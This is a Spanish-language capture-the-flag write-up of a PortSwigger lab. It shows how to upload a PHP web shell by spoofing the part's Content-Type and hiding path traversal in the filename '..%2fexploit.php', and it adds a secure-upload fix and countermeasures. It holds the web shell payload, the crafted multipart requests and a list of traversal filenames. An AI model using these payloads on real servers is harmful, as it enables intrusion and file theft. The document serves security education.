# Writeup: Web shell upload via path traversal (PortSwigger)

- **Lab**: Web shell upload via path traversal
- **URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
- **Categoría**: File upload / Path traversal / Web shell / RCE
- **Dificultad**: Apprentice
- **Credenciales**: `wiener:peter`

---

## 1. Objetivo

Mismo target (`/home/carlos/secret`), mismo endpoint (`/my-account/avatar`). **Dos defensas activas simultáneas**:

- **A**: validación de `Content-Type` del part multipart (heredada del lab anterior).
- **B**: el directorio de uploads (`/files/avatars/`) **no ejecuta scripts PHP**. El server lo sirve como texto plano.

Sin bypass, `/files/avatars/exploit.php` devuelve el código PHP literal en lugar de ejecutarlo. Bypass: combinar el bypass de Content-Type con path traversal en el `filename` del part. La traversal mueve el archivo a un directorio que sí ejecuta PHP (`/files/`).

Detalle clave: el server **strippea `../` literal del filename** pero **no decodifica `%2f` antes del filter**. Encoding del slash bypass-ea ambos checks.

Payload final (cambios en el part multipart):

```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Después del upload, navegar a `/files/exploit.php`. Server ejecuta PHP y devuelve el secret.

### Insight central

**La defensa "no ejecutar scripts en el directorio de uploads" se rompe si el atacante puede elegir el directorio**. La asunción es que el filename del cliente describe solo el nombre, no el path. Cuando el server respeta el path implícito en el filename (vía `move_uploaded_file($dest_dir . '/' . $client_filename)` o equivalente), el atacante recupera control sobre dónde aterriza el archivo. Combinado con un filter de traversal naïve (que busca `../` literal sin decodificar primero), el bypass es directo. Patrón estructural idéntico al lab "superfluous URL decode" de Path Traversal: **validar antes de la transformación final** abre el bypass.

---

## 2. Recon y resolución

### 2.1 Diagnosticar la defensa

Login `wiener:peter`. Crear `exploit.php`:

```bash
echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' > exploit.php
```

Subir con el bypass del lab anterior (`Content-Type: image/jpeg` en el part). Server acepta:

```
HTTP/2 200 OK
The file avatars/exploit.php has been uploaded.
```

Navegar a `/files/avatars/exploit.php`. Response devuelve **el código PHP literal**:

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Eso confirma: el server sirve el archivo como texto plano. PHP no se ejecuta en `/files/avatars/`. El upload pasa, pero la ejecución no. Necesitamos mover el archivo a otro directorio.

### 2.2 Primer intento de bypass: `../` literal

Modificar el part:

```
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
Content-Type: image/jpeg
```

Server responde 200 OK con: *"The file **avatars/exploit.php** has been uploaded"*. Notar: dice "avatars/exploit.php", no "../exploit.php". El server **strippeó** el `../` antes de decidir el path final. Confirmación inmediata: visitar `/files/exploit.php` devuelve 404 (el archivo nunca llegó a `/files/`).

La defensa hace algo equivalente a:

```python
filename = filename.replace('../', '')
```

### 2.3 Bypass: URL-encoding del slash

Si el filter busca `../` literal en el filename, codificar el `/` con `%2f`:

```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: image/jpeg
```

Trace mental:
- Filter busca `../` literal en el filename. El filename actual es `..%2fexploit.php` — el filter no matchea (no hay `/` literal).
- El framework HTTP/PHP **decodifica el `%2f` después del filter**, al normalizar el filename para el filesystem. El path efectivo es `../exploit.php`.
- `move_uploaded_file($base . $filename)` con `base = /var/www/files/avatars/` y `filename = ../exploit.php` → `/var/www/files/avatars/../exploit.php` → canonicalizado a `/var/www/files/exploit.php`.

Server responde 200 OK con un mensaje distinto: *"The file ../exploit.php has been uploaded"* (o similar — el log confirma que el path no fue strippeado esta vez).

Visitar `/files/exploit.php` devuelve el secret. Lab solved.

---

## 3. Por qué funciona

### 3.1 Anatomía del bug

```php
// Antipatrón - filter de traversal antes de decodificar
$filename = $_FILES['avatar']['name'];
$filename = str_replace('../', '', $filename);  // Filter sobre el string crudo

// move_uploaded_file decodifica internamente o concatena con el dest_dir
$dest = '/var/www/files/avatars/' . $filename;
move_uploaded_file($_FILES['avatar']['tmp_name'], $dest);
```

Tres componentes del bug:

1. **Filter sobre el filename crudo**: el `str_replace` busca `../` literal. Cuando el filename es `..%2fexploit.php`, el filter no encuentra el patrón (porque el slash está encoded).
2. **Decodificación implícita posterior**: en algún punto del pipeline (PHP framework, OS API, framework de upload), el `%2f` se interpreta como `/`. La decodificación puede ser explícita (llamada a `urldecode`) o implícita (algún parser que normaliza el filename para el filesystem).
3. **El `dest` final contiene `..` interpretado por `move_uploaded_file`**: la función concatena strings y deja que el filesystem canonicalice. `/var/www/files/avatars/../exploit.php` resuelve a `/var/www/files/exploit.php`.

El bug está en validar antes de decodificar. Si el filter operara sobre la representación final (post-decode), o si el server canonicalizara el destino y verificara que queda dentro de `avatars/`, el bypass no funcionaría.

### 3.2 Comparación con el lab "superfluous URL decode" del cluster Path Traversal

El antipatrón es estructuralmente idéntico al lab Practitioner del cluster Path Traversal:

| Aspecto | Path Traversal `superfluous-url-decode` | File Upload `path-traversal` (este) |
|---|---|---|
| Vector | Lectura de archivo via `?filename=` | Escritura de archivo via upload |
| Filter | Rechaza `../` y `..%2f` | Strippea `../` literal |
| Bypass | `..%252f` (doble encoding) | `..%2f` (single encoding) |
| Defensa rota | Validar antes del segundo decode | Validar antes del primer decode |

La generalización: **cualquier validación de tokens en una representación intermedia del input es bypass-eable** si hay una transformación posterior que materializa el token. URL-decode, HTML-decode, Unicode normalization, symlink resolution, canonicalization del filesystem — todas son transformaciones que pueden convertir un input "limpio" en uno "malicioso" después del check.

### 3.3 Las dos defensas y por qué se necesitan ambas

| Defensa | Ámbito | Bypass de este lab |
|---|---|---|
| Content-Type del part | Validación del upload | `Content-Type: image/jpeg` en el part |
| `php_flag engine off` en `/files/avatars/` | Config del web server | `..%2f` en filename → archivo aterriza en `/files/` que sí ejecuta |

Notar que la **defensa B (no ejecutar scripts en el dir de uploads) es defensa-en-profundidad correcta**: si la validación de upload falla, el archivo aterriza en un directorio donde no se ejecuta. Pero la defensa-en-profundidad solo funciona si **el atacante no puede elegir dónde aterriza el archivo**. Cuando el filename del cliente determina el path final (sin canonicalización ni rename), el atacante mueve el archivo al directorio que sí ejecuta. La defensa-en-profundidad colapsa en una sola línea de defensa.

### 3.4 ¿Por qué `/files/` ejecuta PHP pero `/files/avatars/` no?

Configuración Apache típica:

```apache
# /etc/apache2/sites-enabled/000-default.conf
<Directory /var/www/files>
    # Por defecto, Apache procesa .php con el motor PHP
</Directory>

# /var/www/files/avatars/.htaccess (o config equivalente)
<Files *.php>
    SetHandler text/plain
</Files>
# O: php_flag engine off
```

El sysadmin configuró el directorio `avatars/` específicamente para no ejecutar PHP, anticipando que ahí aterrizan uploads de usuarios. Pero el directorio padre `/files/` sigue con la config default — ejecuta PHP. Cuando el atacante mueve el archivo a `/files/`, recupera la ejecución.

La defensa correcta sería **negar ejecución en TODO el árbol de uploads**, no solo en el directorio inmediato. O mejor: almacenar fuera del document root, y servir vía un endpoint dedicado que setea Content-Type explícito.

### 3.5 Defensa correcta

```php
// Fix - validar el path canonico final, no el filename del cliente
$base = realpath('/var/www/files/avatars/');

// Generar nombre server-side, ignorar el filename del cliente
$ext = strtolower(pathinfo($_FILES['avatar']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, ['jpg', 'jpeg', 'png'])) { http_response_code(400); exit; }

// Magic bytes del contenido real
$mime = mime_content_type($_FILES['avatar']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'])) { http_response_code(400); exit; }

// Filename completamente server-controlled
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
$dest = $base . '/' . $new_name;

// Verificar que el destino canonicalizado queda dentro del base
$canon = realpath(dirname($dest)) . '/' . basename($dest);
if (strpos($canon, $base . '/') !== 0) {
    http_response_code(403); exit;
}

move_uploaded_file($_FILES['avatar']['tmp_name'], $dest);
```

5 capas:
1. **Whitelist de extensión**.
2. **Magic bytes del contenido real**.
3. **Filename completamente server-controlled** (UUID/hash, no filename del cliente). Cierra el bug del lab — el filename del cliente no afecta nada.
4. **Verificar path canónico final**: si por alguna razón el destino queda fuera de `base`, abort. Defensa-en-profundidad incluso con filename server-side.
5. **Config del server**: deshabilitar ejecución en TODO el árbol de uploads (`/files/`, no solo `/files/avatars/`).

### 3.6 Patrón estructural común con los labs anteriores del cluster

| Lab | Defensa naïve | Bypass | Asunción rota |
|---|---|---|---|
| `rce-via-web-shell-upload` | ninguna | `exploit.php` | (no hay defensa) |
| `content-type-restriction-bypass` | validar `Content-Type` del part | `Content-Type: image/jpeg` | "el Content-Type del cliente describe el tipo real" |
| **`path-traversal` (este)** | strip de `../` + dir sin scripts | `..%2fexploit.php` + Content-Type bypass | "el filename del cliente describe solo el nombre, no el path" + "validar input crudo equivale a validar path final" |

Cada lab agrega una defensa naïve más sofisticada y rompe la asunción detrás. Este lab requiere componer dos bypasses (Content-Type + path traversal), porque las dos defensas existen simultáneamente.

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. Upload con Content-Type bypass]
    B[2. /files/avatars/exploit.php devuelve PHP literal]
    C[3. Diagnostico: dir sin ejecucion de PHP]
    D[4. Probar filename=../exploit.php - server strippea]
    E[5. Probar filename=..%2fexploit.php - server respeta]
    F[6. Archivo aterriza en /files/exploit.php]
    G[7. GET /files/exploit.php - server ejecuta PHP]
    H[8. Body de response = secret]
    I[9. Submit secret - lab solved]

    A --> B --> C --> D --> E --> F --> G --> H --> I
```



Tres ideas:

1. **Defensa-en-profundidad colapsa si el atacante controla el directorio**: deshabilitar ejecución en `/files/avatars/` es defensa correcta solo si el filename del cliente no puede mover el archivo. Path traversal en el filename rompe la asunción.
2. **Filter de string sobre input crudo se bypass-ea con encoding**: el server stripea `../` literal pero no decodifica `%2f` antes del filter. Mismo antipatrón que "superfluous URL decode" del cluster Path Traversal — validar antes de la transformación final.
3. **Composición de bypasses**: este lab requiere dos bypasses simultáneos (Content-Type del part + path traversal en filename) porque las dos defensas existen al mismo tiempo. Lab progresivo donde cada defensa anterior sigue activa.

---

## 5. Contramedidas

1. **Filename server-controlled**: rename a UUID/hash, ignorar completamente el filename del cliente. Cierra todos los bugs basados en path en el filename. La intención del cliente (nombre legible) se puede guardar en metadatos separados.
2. **Magic bytes del contenido real**: validar el tipo desde los primeros bytes del archivo, no desde el header `Content-Type` ni la extensión.
3. **Whitelist estricta de extensión** (sintaxis del nombre final, no del input).
4. **Canonicalizar el path destino y verificar prefijo**: `realpath(dest).startswith(base + '/')`. Defensa-en-profundidad incluso con filename server-side.
5. **Deshabilitar ejecución de scripts en TODO el árbol de uploads**, no solo en el directorio inmediato. La defensa-en-profundidad debe cubrir todo el subtree donde aterrizan uploads.
6. **Almacenar fuera del document root**: lo más simple. El web server nunca toca los archivos directamente; un endpoint dedicado los sirve con Content-Type explícito.
7. **Rechazar `/`, `\`, `..`, null bytes en filenames** como defensa-en-profundidad: validación restrictiva del filename incluso si el server lo va a renombrar.
8. **Tests automatizados**: por cada endpoint que acepte uploads, suite con filenames `../foo.php`, `..%2ffoo.php`, `..%252ffoo.php`, `..\foo.php`, `foo.php\0.jpg`, `/etc/foo`. Cualquier upload que aterrice fuera del directorio esperado es bug.
9. **Code review checklist**: cualquier `move_uploaded_file($dest_dir . '/' . $client_filename)` o equivalente sin canonicalización es bug. Marcar.
10. **Mínimo privilegio del proceso**: el web server no debe poder escribir fuera del directorio de uploads. Confining del proceso (chroot, contenedor, AppArmor/SELinux) limita el daño.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Web shell upload via path traversal*. https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
- PortSwigger Web Security Academy. (s.f.). *File upload vulnerabilities*. https://portswigger.net/web-security/file-upload
- OWASP Foundation. (s.f.). *Unrestricted File Upload*. https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- OWASP Foundation. (s.f.). *File Upload Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP Foundation. (s.f.). *Path Traversal*. https://owasp.org/www-community/attacks/Path_Traversal
- MITRE Corporation. (2024). *CWE-434: Unrestricted Upload of File with Dangerous Type*. https://cwe.mitre.org/data/definitions/434.html
- MITRE Corporation. (2024). *CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')*. https://cwe.mitre.org/data/definitions/22.html
- MITRE Corporation. (2024). *CWE-180: Incorrect Behavior Order: Validate Before Canonicalize*. https://cwe.mitre.org/data/definitions/180.html
- MITRE Corporation. (2024). *ATT&CK Technique T1505.003: Server Software Component — Web Shell*. https://attack.mitre.org/techniques/T1505/003/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Upload Insecure Files*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 10 (Attacking Back-End Components — File Upload Vulnerabilities).
- Inventario interno: [`inventario/04-explotacion/web/explotacion-fileupload.md`](../../../inventario/04-explotacion/web/explotacion-fileupload.md)
- Inventario interno (path traversal): [`inventario/03-analisis-vulnerabilidades/web/analisis-lfi-rfi.md`](../../../inventario/03-analisis-vulnerabilidades/web/analisis-lfi-rfi.md)
- Labs hermanos del cluster:
  - [`learning/portswigger/file-upload-rce-via-web-shell-upload/writeup.md`](../file-upload-rce-via-web-shell-upload/writeup.md)
  - [`learning/portswigger/file-upload-content-type-restriction-bypass/writeup.md`](../file-upload-content-type-restriction-bypass/writeup.md)
- Lab análogo en el cluster Path Traversal (mismo antipatrón en otra dirección):
  - [`learning/portswigger/file-path-traversal-superfluous-url-decode/writeup.md`](../file-path-traversal-superfluous-url-decode/writeup.md)
